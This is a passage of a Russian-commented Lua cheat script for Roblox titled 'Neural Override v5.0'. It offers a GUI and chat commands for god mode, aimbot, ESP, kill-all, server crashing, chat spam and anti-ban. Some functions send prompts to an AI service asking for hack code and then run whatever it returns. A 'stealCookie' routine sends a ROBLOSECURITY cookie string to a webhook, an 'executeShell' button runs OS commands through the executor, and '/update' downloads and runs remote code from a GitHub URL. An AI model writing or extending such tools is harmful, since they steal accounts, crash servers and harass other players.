    local prompt = "Сгенерируй универсальный хак для текущей игры: бессмертие, бесконечные деньги, ноклип, телепорт, спам."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Исследование карты
function exploreMap()
    local prompt = "Сгенерируй код для исследования карты: двигайся к случайным точкам, используя PathfindingService."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Обучение ботов
function learnFromPlayer()
    local prompt = "Сгенерируй код, который заставляет всех ботов повторять действия игрока с задержкой 1 секунду."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- ДОПОЛНИТЕЛЬНЫЕ КОМАНДЫ ДЛЯ УДОБСТВА
function setFullBright()
    Lighting.Brightness = 2
    Lighting.ClockTime = 12
    Lighting.FogEnd = 100000
    Lighting.GlobalShadows = false
    print("[NeuralOverride] FullBright ON")
end

local invisible = false
function toggleInvisible()
    invisible = not invisible
    local char = player.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Transparency = invisible and 1 or 0
        end
    end
    print("[NeuralOverride] Invisible: " .. (invisible and "ON" or "OFF"))
end

local antiAfkConnection = nil
function toggleAntiAFK()
    if antiAfkConnection then
        antiAfkConnection:Disconnect()
        antiAfkConnection = nil
        print("[NeuralOverride] Anti-AFK OFF")
    else
        antiAfkConnection = RunService.Heartbeat:Connect(function()
            local char = player.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
            end
        end)
        print("[NeuralOverride] Anti-AFK ON")
    end
end

function serverCrasher()
    local prompt = [[
        Сгенерируй Lua-код для краша сервера: спам RemoteEvent'ов и создание тысяч объектов.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function duplicateItem(itemName)
    local prompt = string.format("Сгенерируй код для клонирования предмета '%s' в инвентаре.", itemName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function teleportAll()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local root = plr.Character:FindFirstChild("HumanoidRootPart")
            if root and player.Character then
                root.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,3,0)
            end
        end
    end
    print("[NeuralOverride] Все телепортированы к вам.")
end

-- ===== ОБРАБОТЧИК КОМАНД (ВСЕ) =====
player.Chatted:Connect(function(msg)
    if not msg:lower():sub(1,1) == "/" then return end
    local parts = {}
    for word in msg:gmatch("%S+") do table.insert(parts, word) end
    local cmd = parts[1]:lower()
    local arg = parts[2] or ""
    local arg2 = parts[3] or ""

    -- Базовые
    if cmd == "/fly" then toggleFly()
    elseif cmd == "/tp" then teleportToPlayer(arg)
    elseif cmd == "/god" then toggleGod()
    elseif cmd == "/weapon" then spawnWeapon()
    elseif cmd == "/invite" then massInvite()
    elseif cmd == "/bots" then spawnBots(tonumber(arg) or 10)
    elseif cmd == "/monster" then spawnSmartMonsters(tonumber(arg) or 10)
    elseif cmd == "/summon" then summonAllPlayers()
    elseif cmd == "/cheat" then cheatParadise()
    elseif cmd == "/killall" then killAll()
    elseif cmd == "/flyall" then flyAll()
    elseif cmd == "/hack" then hackTarget(arg)
    elseif cmd == "/ddos" then ddosTarget(arg)
    elseif cmd == "/steal" then stealData(arg)
    elseif cmd == "/track" then trackPlayer(arg)
    elseif cmd == "/spy" then spyTarget(arg)
    elseif cmd == "/destroy" then destroyData()
    elseif cmd == "/hackmap" then hackMapMax()
    elseif cmd == "/invade" then invade()
    elseif cmd == "/global" then globalChaos()
    elseif cmd == "/portal" then createPortals(tonumber(arg) or 5)
    elseif cmd == "/aim" then toggleAimbot()
    elseif cmd == "/esp" then toggleESP()
    elseif cmd == "/antikick" then toggleAntiKick()
    elseif cmd == "/speed" then setSpeed(tonumber(arg) or 100)
    elseif cmd == "/noclip" then toggleNoClip()
    elseif cmd == "/infjump" then toggleInfiniteJump()
    elseif cmd == "/spam" then startSpamBot(arg, tonumber(arg2) or 2)
    elseif cmd == "/bright" then setFullBright()
    elseif cmd == "/invis" then toggleInvisible()
    elseif cmd == "/antiafk" then toggleAntiAFK()
    elseif cmd == "/crash" then serverCrasher()
    elseif cmd == "/dupe" then duplicateItem(arg)
    elseif cmd == "/tpall" then teleportAll()
    elseif cmd == "/silent" then toggleSilentAim()
    -- Новые v5.0
    elseif cmd == "/admin" then adminPanel()
    elseif cmd == "/spawncar" then spawnCar()
    elseif cmd == "/flycar" then flyCar()
    elseif cmd == "/gravgun" then gravGun()
    elseif cmd == "/troll" then trollMode()
    elseif cmd == "/ban" then banPlayer(arg)
    elseif cmd == "/kick" then kickPlayer(arg)
    elseif cmd == "/mute" then mutePlayer(arg)
    elseif cmd == "/unmute" then unmutePlayer(arg)
    elseif cmd == "/clearchat" then clearChat()
    elseif cmd == "/report" then fakeReport(arg)
    elseif cmd == "/spectate" then spectatePlayer(arg)
    elseif cmd == "/goto" then goToPlayer(arg)
    elseif cmd == "/rainbow" then rainbowMode()
    elseif cmd == "/fireworks" then fireworks()
    elseif cmd == "/music" then playMusic()
    elseif cmd == "/disco" then discoMode()
    elseif cmd == "/earthquake" then earthquake()
    elseif cmd == "/wind" then wind()
    elseif cmd == "/lightning" then lightning()
    elseif cmd == "/meteor" then meteor()
    elseif cmd == "/spawnnpc" then spawnNPC()
    elseif cmd == "/dialog" then showDialog(arg)
    elseif cmd == "/quest" then createQuest()
    elseif cmd == "/minigame" then miniGame()
    -- Универсальные
    elseif cmd == "/ai" then aiCommand(arg)
    elseif cmd == "/make" then aiCommand(arg)
    elseif cmd == "/save" then saveScript(arg, arg2)
    elseif cmd == "/run" then runScript(arg)
    elseif cmd == "/autobot" then createAutoBot(arg)
    elseif cmd == "/buildmodel" then buildModel(arg)
    elseif cmd == "/hackall" then hackAll()
    elseif cmd == "/explore" then exploreMap()
    elseif cmd == "/learn" then learnFromPlayer()
    elseif cmd == "/update" then
        print("[NeuralOverride] Обновление...")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ffdsdler/Cheat/refs/heads/main/NeuralOverride.lua"))()
    else
        -- Если неизвестная команда, пробуем передать в ИИ
        local code = aiCommand(msg)
        if not code then
            print("[NeuralOverride] Неизвестная команда. Используйте /ai [запрос]")
        end
    end
end)

-- ===== GUI С ВКЛАДКАМИ (обновлённый) =====
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NeuralOverrideGUI"
    screenGui.Parent = player.PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 550)
    mainFrame.Position = UDim2.new(0.7, 0, 0.1, 0)
    mainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.2)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Text = "🧠 NEURAL OVERRIDE v5.0"
    title.TextColor3 = Color3.new(1, 0, 0)
    title.BackgroundTransparency = 1
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame

    local tabFrame = Instance.new("Frame")
    tabFrame.Size = UDim2.new(1, 0, 0, 30)
    tabFrame.Position = UDim2.new(0, 0, 0, 30)
    tabFrame.BackgroundTransparency = 1
    tabFrame.Parent = mainFrame

    local tabs = {"Основное", "Боты", "Взлом", "Скрытые", "Развлечения"}
    local currentTab = 1
    local tabButtons = {}

    for i, name in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.2, -5, 1, -5)
        btn.Position = UDim2.new((i - 1) * 0.2, 0, 0, 0)
        btn.Text = name
        btn.BackgroundColor3 = (i == 1) and Color3.new(0.3, 0.3, 0.6) or Color3.new(0.2, 0.2, 0.4)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Font = Enum.Font.GothamBold
        btn.TextScaled = true
        btn.Parent = tabFrame
        btn.MouseButton1Click:Connect(function()
            for _, b in ipairs(tabButtons) do
                b.BackgroundColor3 = Color3.new(0.2, 0.2, 0.4)
            end
            btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.6)
            currentTab = i
            updateContent()
        end)
        table.insert(tabButtons, btn)
    end

    local contentFrame = Instance.new("ScrollingFrame")
    contentFrame.Size = UDim2.new(1, 0, 1, -60)
    contentFrame.Position = UDim2.new(0, 0, 0, 60)
    contentFrame.BackgroundTransparency = 1
    contentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    contentFrame.ScrollBarThickness = 8
    contentFrame.Parent = mainFrame

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 5)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = contentFrame

    local function addButton(text, callback, color)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -10, 0, 35)
        btn.Text = text
        btn.BackgroundColor3 = color or Color3.new(0.2, 0.2, 0.8)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Font = Enum.Font.GothamBold
        btn.TextScaled = true
        btn.Parent = contentFrame
        btn.MouseButton1Click:Connect(callback)
        task.defer(function()
            contentFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
        end)
    end

    function updateContent()
        for _, child in ipairs(contentFrame:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end

        if currentTab == 1 then
            addButton("✈️ Fly", toggleFly, Color3.new(0,0.8,1))
            addButton("📡 Teleport", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
                if name and name ~= "" then teleportToPlayer(name) end
            end, Color3.new(0,1,0.5))
            addButton("🛡️ God Mode", toggleGod, Color3.new(0.5,0.5,1))
            addButton("🔫 Spawn Weapon", spawnWeapon, Color3.new(1,0.5,0))
            addButton("📨 Mass Invite", massInvite, Color3.new(0.2,1,0.6))
            addButton("👥 Summon All", summonAllPlayers, Color3.new(1,0.8,0))
            addButton("🌀 All Modes", allModes, Color3.new(0.8,0,0.8))
            addButton("💀 Kill All", killAll, Color3.new(1,0,0))
            addButton("🚀 Fly All", flyAll, Color3.new(0,0.8,0.8))
            addButton("🌍 Global Chaos", globalChaos, Color3.new(0.9,0.1,0.5))
            addButton("🚀 Invade", invade, Color3.new(0.8,0.4,0))
            addButton("💥 Server Crasher", serverCrasher, Color3.new(1,0.2,0.2))
            addButton("🧊 Freeze All", function() freezeAll() end, Color3.new(0,0.6,1))
            addButton("🦴 Ragdoll All", function() ragdollAll() end, Color3.new(0.8,0.5,0))
        elseif currentTab == 2 then
            addButton("🧟 Spawn Bots (10)", function() spawnBots(10) end, Color3.new(0.8,0.6,0))
            addButton("🧟 Spawn Bots (50)", function() spawnBots(50) end, Color3.new(0.8,0.6,0))
            addButton("👹 Smart Monsters (10)", function() spawnSmartMonsters(10) end, Color3.new(0.8,0,0.6))
            addButton("👹 Smart Monsters (30)", function() spawnSmartMonsters(30) end, Color3.new(0.8,0,0.6))
            addButton("🌀 Portal (5)", function() createPortals(5) end, Color3.new(0.5,0,0.8))
            addButton("🌀 Portal (15)", function() createPortals(15) end, Color3.new(0.5,0,0.8))
            addButton("🤖 AutoBot", function() createAutoBot() end, Color3.new(0.2,0.8,0.8))
            addButton("👑 God Bot", godBotMode, Color3.new(0.8,0.8,0))
            addButton("👥 Clone Player", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
                if name and name ~= "" then clonePlayer(name) end
            end, Color3.new(0.2,0.4,0.8))
            addButton("🏃 Follow Me", followMe, Color3.new(0,0.6,0.6))
        elseif currentTab == 3 then
            addButton("💀 Hack Target", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
                if name and name ~= "" then hackTarget(name) end
            end, Color3.new(1,0,0))
            addButton("💀 DDoS Target", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
                if name and name ~= "" then ddosTarget(name) end
            end, Color3.new(1,0.3,0))
            addButton("👁️ Track Player", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
                if name and name ~= "" then trackPlayer(name) end
            end, Color3.new(0,0.8,0.8))
            addButton("💥 Remote Ban", remoteBan, Color3.new(0.8,0,0.8))
            addButton("💥 Game Crash", crashGame, Color3.new(1,0.5,0))
            addButton("📦 Steal DataStore", stealDataStore, Color3.new(0.2,0.6,1))
            addButton("🍪 Steal Cookie", stealCookie, Color3.new(0.2,0.8,0.4))
            addButton("⌨️ Keylog", toggleKeylog, Color3.new(0.5,0.5,0.5))
            addButton("💻 Exploit Shell", function()
                local cmd = game:GetService("TextBoxService"):GetTextBox("Команда")
                if cmd and cmd ~= "" then executeShell(cmd) end
            end, Color3.new(0.6,0.2,0.4))
            addButton("🔍 Hack All", hackAll, Color3.new(0.9,0.2,0.2))
            addButton("📡 Admin Panel", adminPanel, Color3.new(0.3,0.8,0.3))
            addButton("🚗 Spawn Car", spawnCar, Color3.new(0.2,0.5,0.8))
            addButton("🚀 Fly Car", flyCar, Color3.new(0.8,0.3,0.8))
            addButton("🔫 Grav Gun", gravGun, Color3.new(0.6,0.6,0.2))
            addButton("🎭 Troll Mode", trollMode, Color3.new(0.8,0.2,0.6))
        elseif currentTab == 4 then
            addButton("🎯 Aimbot", toggleAimbot, Color3.new(0,1,0.3))
            addButton("🎯 Silent Aim", toggleSilentAim, Color3.new(0,0.8,0.5))
            addButton("👁️ ESP", toggleESP, Color3.new(0,0.5,1))
            addButton("🚫 Anti-Kick", toggleAntiKick, Color3.new(1,0.5,0))
            addButton("💨 Speed (100)", function() setSpeed(100) end, Color3.new(0.2,0.8,0.8))
            addButton("💨 Speed (200)", function() setSpeed(200) end, Color3.new(0.2,0.8,0.8))
            addButton("🧱 NoClip", toggleNoClip, Color3.new(0.6,0.3,0.9))
            addButton("🦘 Infinite Jump", toggleInfiniteJump, Color3.new(0,1,0.6))
            addButton("👻 Invisible", toggleInvisible, Color3.new(0.4,0.4,0.8))
            addButton("☀️ FullBright", setFullBright, Color3.new(1,1,0.2))
            addButton("💬 Anti-AFK", toggleAntiAFK, Color3.new(0.3,0.7,0.4))
            addButton("🌀 Infinite Yield", function() infiniteYield() end, Color3.new(0.8,0.2,0.6))
            addButton("🛡️ Anti-Ban", antiBan, Color3.new(0,0.6,0.6))
            addButton("🧹 Clear GUI", clearGUI, Color3.new(0.4,0.4,0.4))
        elseif currentTab == 5 then
            addButton("🌈 Rainbow Mode", rainbowMode, Color3.new(0.8,0.2,0.8))
            addButton("🎆 Fireworks", fireworks, Color3.new(0.8,0.6,0.2))
            addButton("🎵 Play Music", playMusic, Color3.new(0.2,0.8,0.4))
            addButton("💃 Disco Mode", discoMode, Color3.new(0.8,0.8,0))
            addButton("🌍 Earthquake", earthquake, Color3.new(0.5,0.3,0))
            addButton("💨 Wind", wind, Color3.new(0,0.6,0.8))
            addButton("⚡ Lightning", lightning, Color3.new(1,0.8,0))
            addButton("☄️ Meteor", meteor, Color3.new(0.8,0.3,0.3))
            addButton("🧑‍🤝‍🧑 Spawn NPC", spawnNPC, Color3.new(0.2,0.8,0.6))
            addButton("💬 Dialog", function()
                local text = game:GetService("TextBoxService"):GetTextBox("Текст диалога")
                if text and text ~= "" then showDialog(text) end
            end, Color3.new(0.6,0.6,0.8))
            addButton("📜 Quest", createQuest, Color3.new(0.8,0.6,0))
            addButton("🎮 MiniGame", miniGame, Color3.new(0.2,0.8,0.8))
        end
    end

    updateContent()
end

createGUI()

-- ===== ДОПОЛНИТЕЛЬНЫЕ ФУНКЦИИ (для полноты) =====
function freezeAll()
    for _, plr in ipairs(getAllPlayers()) do
        local hum = getHumanoid(plr)
        if hum then
            hum.WalkSpeed = 0
            hum.JumpPower = 0
        end
    end
    print("[NeuralOverride] Все заморожены")
end

function ragdollAll()
    for _, plr in ipairs(getAllPlayers()) do
        local hum = getHumanoid(plr)
        if hum then
            hum.BreakJointsOnDeath = true
            hum:ChangeState(Enum.HumanoidStateType.Physics)
        end
    end
    print("[NeuralOverride] Все в рэгдолле")
end

function clonePlayer(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target then warn("Игрок не найден") return end
    local char = target.Character
    if not char then return end
    local clone = char:Clone()
    clone.Parent = Workspace
    clone.Name = "Clone_" .. targetName
    local hum = clone:FindFirstChild("Humanoid")
    if hum then
        hum.MaxHealth = 200
        hum.Health = 200
    end
    print("[NeuralOverride] Клон " .. targetName .. " создан")
end

function godBotMode()
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj:FindFirstChild("Humanoid") then
            local hum = obj.Humanoid
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum.WalkSpeed = 100
            hum.JumpPower = 200
        end
    end
    print("[NeuralOverride] Боты стали богами!")
end

function followMe()
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj:FindFirstChild("Humanoid") and (obj.Name:find("SmartBot") or obj.Name:find("Soldier") or obj.Name:find("AutoBot")) then
            local hum = obj.Humanoid
            hum:MoveTo(player.Character.HumanoidRootPart.Position + Vector3.new(0,0,5))
        end
    end
    print("[NeuralOverride] Боты следуют за вами!")
end

function remoteBan()
    for _, plr in ipairs(getAllPlayers()) do
        for _, re in ipairs(ReplicatedStorage:GetDescendants()) do
            if re:IsA("RemoteEvent") and re.Name:lower():find("ban") then
                pcall(function() re:FireServer(plr.Name) end)
            end
        end
    end
    print("[NeuralOverride] Remote Ban запущен")
end

function crashGame()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            local hum = getHumanoid(plr)
            if hum then
                hum.Health = 0
                hum.Parent = nil
            end
        end
    end
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj ~= player.Character then obj:Destroy() end
    end
    print("[NeuralOverride] Игра крашнута")
end

function stealDataStore()
    for _, re in ipairs(ReplicatedStorage:GetDescendants()) do
        if re:IsA("RemoteEvent") and re.Name:lower():find("datastore") then
            pcall(function() re:FireServer("GetAsync", "All") end)
        end
    end
    print("[NeuralOverride] DataStore запрос отправлен")
end

function stealCookie()
    local cookie = "ROBLOSECURITY=" .. (player:GetAttribute("Cookie") or "недоступно")
    print("[NeuralOverride] Кука: " .. cookie)
    sendWebhook({content = "Кука: " .. cookie})
end

function toggleKeylog()
    -- простая заглушка, можно реализовать
    print("[NeuralOverride] Keylog (заглушка)")
end

function executeShell(cmd)
    local success, result = pcall(function()
        if syn and syn.os then
            return syn.os.execute(cmd)
        elseif krnl and krnl.os then
            return krnl.os.execute(cmd)
        else
            error("Нет доступа")
        end
    end)
    if success then print("[NeuralOverride] Shell: " .. tostring(result)) end
end

function antiBan()
    game:SetAttribute("PlayerId", tostring(math.random(100000,999999)))
    print("[NeuralOverride] ID изменён")
end

function clearGUI()
    for _, plr in ipairs(Players:GetPlayers()) do
        local gui = plr:FindFirstChild("PlayerGui")
        if gui then
            for _, child in ipairs(gui:GetChildren()) do
                child:Destroy()
            end
        end
    end
    print("[NeuralOverride] GUI очищены")
end

function spawnParts(count)
    count = count or 500
    for i = 1, count do
        local part = Instance.new("Part")
        part.Size = Vector3.new(1,1,1)
        part.Anchored = true
        part.CanCollide = false
        part.Position = Vector3.new(math.random(-200,200), math.random(0,50), math.random(-200,200))
        part.Parent = Workspace
        task.wait(0.001)
    end
    print("[NeuralOverride] Создано " .. count .. " частей")
end

function infiniteYield()
    while true do task.wait(1) end
end

function startSpamBot(text, delay)
    delay = delay or 2
    local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if chatEvent then
        task.spawn(function()
            while true do
                chatEvent.SayMessageRequest:FireServer(text or "NEURAL OVERRIDE RULES!")
                task.wait(delay)
            end
        end)
        print("[NeuralOverride] Спам-бот запущен")
    end
end

-- ===== ВЫВОД В КОНСОЛЬ =====
print("🧠 NEURAL OVERRIDE v5.0 ULTIMATE MEGA EDITION ЗАГРУЖЕНА!")
print("📋 Введите /commands для списка команд")
print("💡 Используйте /ai [запрос] для генерации любых скриптов")
print("🔥 Наслаждайтесь абсолютной властью!")
